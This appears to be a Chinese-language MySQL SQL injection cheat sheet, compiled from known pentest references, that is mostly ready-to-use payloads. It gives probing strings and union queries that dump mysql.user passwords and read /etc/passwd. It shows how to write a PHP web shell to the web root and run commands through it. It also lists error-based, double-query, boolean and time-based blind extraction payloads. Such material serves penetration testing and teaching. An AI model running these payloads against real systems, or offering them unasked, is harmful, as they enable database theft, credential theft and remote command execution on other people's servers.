SQL注入可以松散地分为三类，基于联合、基于错误（XPath和双查询）和推断（基于时间和布尔）

为了避免重复，在您看到：version()（用于检索数据库版本）的任何位置，都可以将其替换为：

database() – 检索当前数据库的名称 
user() – 检索数据库运行时使用的用户名
@@hostname – 检索服务器的主机名和IP地址
@@datadir – 检索数据库文件在服务器中的位置

### 漏洞探测 Payloads

payload过滤符号判断
```sql
<>"'%;)(&+-=
|
!
?
/
//
//*
'
' --
1 or 1=1
1;SELECT%20*
1 waitfor delay '0:0:10'--
'%20or%20''='
'%20or%201=1
')%20or%20('x'='x
'%20or%20'x'='x
%20or%20x=x
%20'sleep%2050'
%20$(sleep%2050)
%21
23 OR 1=1
%26
%27%20or%201=1
%28
%29
%2A%28%7C%28mail%3D%2A%29%29
%2A%28%7C%28objectclass%3D%2A%29%29
%2A%7C
||6
'||'6
(||6)
%7C
a'
admin' or '
' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
' and 1 in (SELECT var FROM temp)--
anything' OR 'x'='x
"a"" or 1=1--"
a' or 1=1--
"a"" or 3=3--"
a' or 3=3--
a' or 'a' = 'a
&apos;%20OR
' having 1=1--
hi or 1=1 --"
hi' or 1=1 --
"hi"") or (""a""=""a"
hi or a=a
hi' or 'a'='a
hi') or ('a'='a
'hi' or 'x'='x';
insert
like
limit
*(|(mail=*))
*(|(objectclass=*))
or
' or ''='
or 0=0 #"
' or 0=0 --
' or 0=0 #
" or 0=0 --
or 0=0 --
or 0=0 #
' or 1 --'
' or 1/*
; or '1'='1'
' or '1'='1
' or '1'='1'--
' or 1=1
' or 1=1 /*
' or 1=1--
' or 1=1--
'/**/or/**/1/**/=/**/1
‘ or 1=1 --
" or 1=1--
or 1=1
or 1=1--
or 1=1 or ""=
' or 1=1 or ''='
' or 1 in (SELECT @@version)--
or%201=1
or%201=1 --

1 UNION  SELECT 1,2,3 -- -
" UNION  SELECT 1,2,3 -- -
```



### 列数判断
```
1 order by 9 -- -
```
###  测试前台可显示的字段数量
```
1 UNION SELECT 1,2,3,4,5,6,7,8,9 -- -
```

### UNION联合查询

[UNION](http://dev.mysql.com/doc/refman/5.0/en/UNION.html) 用于将我们的SQL注入附加到合法查询，并将我们希望检索的信息与合法查询的信息结合起来。请注意，您需要首先枚举列的数量，这可以通过使用 [ORDER BY](http://www.w3schools.com/php/php_mysql_order_by.asp) 函数或使用具有[NULL](http://dev.mysql.com/doc/refman/5.0/en/null-values.html) 值的UNION来实现。

####  查当前数据库、当前用户、数据库文件在服务器中的位置
```sql
1 UNION ALL SELECT database(),user(),@@datadir -- -
```
####  查mysql库user表信息
```sql
1 UNION ALL SELECT User,Password,3 FROM mysql.user -- -
```
####  查所有库名
```sql
1 UNION ALL SELECT schema_name FROM information_schema.schemata -- -
```
`CONCAT()` 函数用于连接多个字符串值，突破字段限制
```sql
" UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata -- -
```
####  查test库的所有表名
```sql
1 UNION ALL SELECT table_name FROM information_schema.TABLES WHERE table_schema = 'test' -- -
```
`CONCAT()` 函数用于连接多个字符串值，突破字段限制
```sql
1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='test'-- -
```
####  查test表的所有字段名
```sql
1 UNION ALL SELECT column_name FROM information_schema.columns WHERE table_schema = 'test' AND table_name = 'your_table_name' -- -
```
`CONCAT()` 函数用于连接多个字符串值，突破字段限制
```sql
1 UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='your_table_name'-- -
```
####  查test表的具体数据
```sql
1 UNION ALL SELECT user,password FROM db_name.table_name -- -
1 UNION ALL SELECT NULL,concat(0x28,column1,0x3a,column2,0x29) FROM table1-- -
```
####  读取文件
```sql
1 UNION SELECT 1,2,3,4, load_file('/etc/passwd') ,6,7,8,9 -- -
1 UNION SELECT 1,2,3,4, load_file('/var/www/login.php') ,6,7,8,9 -- -
```

####  创建一个文件并检查是否真的存在
```sql
1 UNION SELECT 1,2,3,4,'this is a test message' ,6,7,8,9 into outfile '/var/www/test' -- -
1 UNION SELECT 1,2,3,4, load_file('/var/www/test') ,6,7,8,9 -- -
```

####  创建一个文件以获取shell
```sql
1 UNION SELECT null,null,null,null,'<?php system($_GET['cmd']) ?>' ,6,7,8,9 into outfile '/var/www/shell.php' -- -
1 UNION SELECT null,null,null,null, load_file('/var/www/shell.php') ,6,7,8,9 -- -
```

####  然后转到浏览器，看看是否可以执行命令
```sql
http://<ip_address>/shell.php?cmd=id
```
####  使用UNION保存文件
```sql
1 UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php' -- -
```
### 基于错误注入

当除了MySQL错误之外没有任何输出时，您可以通过该错误强制提取数据。请注意，以下两种方法都可以使用 [Burp’s](http://www.portswigger.net/burp/) [Intruder](http://www.portswigger.net/burp/intruder.html)和 [grep extract](http://portswigger.net/burp/help/intruder_options.html#grepextract) 提取功能轻松实现自动化。

函数

当[ExtractValue()](http://dev.mysql.com/doc/refman/5.1/en/xml-functions.html#function_extractvalue)函数无法解析传递给它的XML数据时，它会生成一个SQL错误。幸运的是，XML数据，以及在我们的情况下，SQL查询的评估结果，将嵌入到后续的错误消息中。在XML查询的开头加上句号或冒号（我们使用下面0x3a的十六进制表示）将确保解析始终失败，从而在提取的数据中生成错误。请注意，这只适用于MySQL 5.1或更高版本。使用[LIMIT](http://php.about.com/od/mysqlcommands/g/Limit_sql.htm)函数循环浏览数据库信息。

#### 检索数据库版本：
```sql
1 AND extractvalue(rand(),concat(0x3a,version()))--
```
#### 检索数据库名称：
```sql
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,schema_name) FROM information_schema.schemata LIMIT 0,1)))--
```
#### 检索表名：
```sql
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1)))--
```
#### 检索列名：
```sql
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(0x3a,TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_NAME="table1" LIMIT 0,1)))--
```
#### 检索数据：
```sql
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(column1,0x3a,column2) FROM table1 LIMIT 0,1)))--
```
#### 从其他数据库检索数据：
```sql
1 AND extractvalue(rand(),concat(0x3a,(SELECT concat(column1,0x3a,column2) FROM database2.table1 LIMIT 0,1)))--
```
### 双重查询

下面使用的函数组合生成一个查询，MySQL编译器接受该查询，但在运行时出错。然后返回错误，但它计算并包括子查询（由于双击），从而将我们的注入结果返回到页面。增加第一个LIMIT以循环浏览数据库信息。

#### 检索数据库版本：
```sql
1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(version(),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
```
#### 检索数据库名称：
```sql
1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.schemata GROUP BY a LIMIT 0,1)b)--
```
#### 检索表名：
```sql
1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.TABLES GROUP BY a LIMIT 0,1)b)--
```
#### 检索列名：
```sql
1 AND (SELECT 1 FROM (SELECT COUNT(*),concat(0x3a,(SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),0x3a,FLOOR(rand(0)*2))a FROM information_schema.COLUMNS GROUP BY a LIMIT 0,1)b)--
```
#### 检索数据：
```sql
1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT column1 FROM table1 LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
```
#### 从其他数据库检索数据：
```sql
1 AND(SELECT 1 FROM(SELECT COUNT(*),concat(0x3a,(SELECT column1 FROM database2.table1 LIMIT 0,1),FLOOR(rand(0)*2))x FROM information_schema.TABLES GROUP BY x)a)--
```
### Inferential

当没有返回任何数据或错误消息时，可以使用时间延迟或真/假响应来检索数据库信息。请注意，自动化工具，如[sqlmap](http://sqlmap.org/)大大加快了这个过程。

#### 布尔

当应用程序返回不同的结果时，会使用这种类型的提取，这取决于我们注入的SQL查询的计算结果是true还是false。如果我们使用[ASCII](http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_ascii)函数（[此处](http://www.flprisktran.wpengine.com/blog/wp-content/uploads/2013/03/ascii_table.jpg)为表）将要检索的数据库信息中的每个单独字符转换为其十进制表示，我们可以使用大于、小于和等于符号创建true或false条件。然后，我们可以使用[SUBSTRING](http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_substring-index)函数循环各个字符，并使用LIMIT函数循环数据库信息。

#### 测试是否存在漏洞。此查询将显示原始页面：
```sql
1 AND 1=1
```
#### 虽然此查询应返回不同的页面：
```sql
1 AND 1=2
```
#### 检索版本：
```sql
1 AND (ascii(substr((SELECT version()),1,1))) > 52--
```
在上下文中检索版本的更好方法是使用 [LIKE](http://dev.mysql.com/doc/refman/5.0/en/string-comparison-functions.html#operator_like)功能：
```sql
1 AND (SELECT version()) LIKE "5%"--
```
#### 检索数据库：
```sql
1 AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 95--
```
#### 检索表：
```sql
1 AND (ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),1,1))) > 95--
```
#### 检索列：
```sql
1 AND (ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),1,1))) > 95--
```
#### 检索数据：
```sql
1 AND (ascii(substr((SELECT column1 FROM table1 LIMIT 0,1),1,1))) > 95--
```
#### 从其他数据库检索数据：
```sql
1 AND (ascii(substr((SELECT column1 FROM database2.table1 LIMIT 0,1),1,1))) > 95--
```
### 基于时间

如果返回相同的页面以获得正确或错误的响应，则[IF](http://dev.mysql.com/doc/refman/5.5/en/if.html)和[SLEEP](http://dev.mysql.com/doc/refman/5.1/en/miscellaneous-functions.html#function_sleep)函数可以创建时间延迟，并用于推导数据库信息。

#### 测试是否存在漏洞：
```sql
1 AND sleep(10)--
```
#### 检索版本：
```sql
1 AND IF((SELECT ascii(substr(version(),1,1))) > 53,sleep(10),NULL)--
```
使用LIKE检索版本：
```sql
1 AND IF((SELECT version()) LIKE "5%",sleep(10),NULL)--
```
#### 检索数据库：
```sql
1 AND IF(((ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)--
```
#### 检索表：
```sql
1 AND IF(((ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema="database1" LIMIT 0,1),1,1))))> 95,sleep(10),NULL)--
```
#### 检索列：
```sql
1 AND IF(((ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE TABLE_NAME="table1" LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)--
```
#### 检索数据：
```sql
1 AND IF(((ascii(substr((SELECT column1 FROM table1 LIMIT 0,1),1,1)))) > 95,sleep(10),NULL)--
```
#### 从其他数据库检索数据：
```sql
1 AND IF(((ascii(substr((SELECT column1 FROM database1.table1 LIMIT 0,1),1,1)))) >95,sleep(10),NULL)--
```

## MySQL 可利用信息

### information_schema数据库说明:

- SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。
  - **schema_name列**：其包含了当前数据库管理系统中所有的数据库
    - SELECT schema_name FROM information_schema.schemata;
    - show databases;
- TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables FROM schemaname的结果取之此表。
  - table_schema : 数据表所属的数据库名
  - table_name : 此列记录当前数据库管理系统中所有表的合集
  - table_schema ：此列记录当前数据库管理系统中所有数据库的合集，可通过语句查看：
  - SELECT table_name FROM information_schema.tables where table_schema = '';
  - https://blog.csdn.net/weixin_40918067/article/details/116868906
- COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns FROM schemaname.tablename的结果取之此表。
  - table_name  表名。
  - column_name  列名。
  - https://blog.csdn.net/cplvfx/article/details/108292814
- STATISTICS表：提供了关于表索引的信息。是show index FROM schemaname.tablename的结果取之此表。
- USER_PRIVILEGES（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。
- SCHEMA_PRIVILEGES（方案权限）表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。
- TABLE_PRIVILEGES（表权限）表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。
- COLUMN_PRIVILEGES（列权限）表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。
- CHARACTER_SETS（字符集）表：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。
- COLLATIONS表：提供了关于各字符集的对照信息。
- COLLATION_CHARACTER_SET_APPLICABILITY表：指明了可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。
- TABLE_CONSTRAINTS表：描述了存在约束的表。以及表的约束类型。
- KEY_COLUMN_USAGE表：描述了具有约束的键列。
- ROUTINES表：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。
- VIEWS表：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。
- TRIGGERS表：提供了关于触发程序的信息。必须有super权限才能查看该表

 ### 常用MySQL函数  

- version()  
- database() 
- user()     
- @@datadir  
## 使用的来源

上述信息来自各种来源，包括：

**[Pentest Monkey’s MySQL injection cheat sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)**  
**[Ferruh Mavituna’s cheat sheet](http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/)**  
**[Kaotic Creations’s article on XPath injection](http://kaoticcreations.blogspot.co.uk/p/xpath-injection-using-extractvalue.html "Kaotic Creations's article on XPath injection")**  
**[Kaotic Creations’s article on double query injection](http://kaoticcreations.blogspot.co.uk/p/double-query-based-sql-injection.html)**

我推荐的其他一些资源是：

[DVWA](http://www.dvwa.co.uk/index.html) – great test bed  
[SQLZoo](http://sqlzoo.net/) – another great (online) test bed